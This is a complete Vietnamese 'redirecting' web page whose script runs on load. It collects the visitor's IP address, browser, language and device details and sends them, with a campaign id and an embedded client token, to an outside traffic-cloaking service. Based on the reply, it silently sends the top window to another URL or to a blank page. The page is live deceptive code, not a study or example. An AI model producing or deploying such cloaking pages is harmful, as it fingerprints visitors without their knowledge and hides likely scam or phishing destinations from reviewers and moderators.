<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body style="background: #111; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
    <p>Đang chuyển hướng, vui lòng đợi...</p>

<script>
async function checkTraffic() {
    try {
        let clientIP = '';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            clientIP = ipData.ip || '';
        } catch (ipError) {
            console.warn('Could not get client IP:', ipError);
        }
 
        let metaTag = document.querySelector('meta[name="referrer"]');
        if (!metaTag) {
            metaTag = document.createElement('meta');
            metaTag.name = 'referrer';
            document.head.appendChild(metaTag);
        }
        metaTag.content = 'origin';

        const params = {
            campaign_id: '658',
            client_token: '221555331:rebahrwBCUvRuf5QNEnnAqMhIxF3FfDGEicCJ2LkxmBHjNUMA4eVoO84PvYwYqjQ',
            ip: clientIP,
            user_agent: navigator.userAgent,
            accept_language: navigator.languages ? navigator.languages.join(',') : navigator.language,
            current_url: window.location.href,
            max_touch_points: String(navigator.maxTouchPoints || 0),
        };

        const response = await fetch('https://api.cloakerly.com/v8/?' + new URLSearchParams(params).toString());
        const data = (await response.text()).trim();
         
        if (data.startsWith('http')) {
            window.top.location.href = data;
        } else if (data === 'true') {
            console.log('Traffic allowed');
        } else {
            window.top.location.href = 'about:blank';
        }
    } catch (error) {
        console.error('cloakerly API error:', error);
    }
}

checkTraffic();
</script>

</body>
</html>
